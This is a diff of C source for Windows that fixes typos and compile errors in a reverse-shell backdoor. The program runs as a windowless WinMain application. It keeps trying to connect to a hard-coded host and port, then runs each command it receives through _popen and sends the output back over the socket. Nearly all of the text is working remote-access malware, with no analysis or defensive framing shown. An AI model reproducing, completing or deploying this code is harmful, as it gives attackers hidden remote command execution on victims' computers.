@@ -1,25 +1,25 @@
-#include<stdio.h>
-#include<stdlib.h>
-#include<unistd.h>
-#include<winsock2.h>
-#include<windows.h>
-#include<winuser.h>
-#include<wininet.h>
-#include<windowsx.h>
-#include<string.h>
-#include<sys/stat.h>
-#include<sys/types.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <winsock2.h>
+#include <windows.h>
+#include <winuser.h>
+#include <wininet.h>
+#include <windowsx.h>
+#include <string.h>
+#include <sys/stat.h>
+#include <sys/types.h>
 
 #define bzero(p,size)(void)memset((p),0,(size))
 
 int sock;
 
-void Shel(){
+void Shell(){
 	char buffer[1024];
 	char container[1024];
 	char total_response[18384];
 
-	while(true){
+	while(1){
 		jump:
 		bzero(buffer,1024);
 		bzero(container,sizeof(container));
@@ -27,15 +27,15 @@ void Shel(){
 
 		recv(sock,buffer,1024,0);
 
-		if(strcmp("q",buffer,1)==0){
+		if(strncmp("q",buffer,1)==0){
 			closesocket(sock);
 			WSACleanup();
 			exit(0);
 		}else{
 			FILE*fp;
 			fp=_popen(buffer,"r");
-			while(fgets(container,1024,fp)!=NUll){
-				stcat(total_response,container);
+			while(fgets(container,1024,fp)!=NULL){
+				strcat(total_response,container);
 			}send(sock,total_response,sizeof(total_response),0);
 			fclose(fp);
 		}
@@ -54,7 +54,7 @@ int APIENTRY WinMain(HINSTANCE hInstance,HINSTANCE hPrev,LPSTR lpCmdLine,int nCm
 	struct sockaddr_in ServAddr;
 	unsigned short ServPort;
 	char *ServIP;
-	WSDATA wsaData;
+	WSADATA wsaData;
 
 	ServIP="192.168.1.8";
 	ServPort=50005;
@@ -69,8 +69,8 @@ int APIENTRY WinMain(HINSTANCE hInstance,HINSTANCE hPrev,LPSTR lpCmdLine,int nCm
 
 	memset(&ServAddr,0,sizeof(ServAddr));
 	ServAddr.sin_family=AF_INET;
-	ServAddr.sin_addr.s_addr.s_addr=inet_addr(ServIP);
-	ServAddr/sin_port=htons(ServPort);
+	ServAddr.sin_addr.s_addr=inet_addr(ServIP);
+	ServAddr.sin_port=htons(ServPort);
 
 	start:
 	while (connect(sock,(struct sockaddr*)&ServAddr,sizeof(ServAddr))!=0){
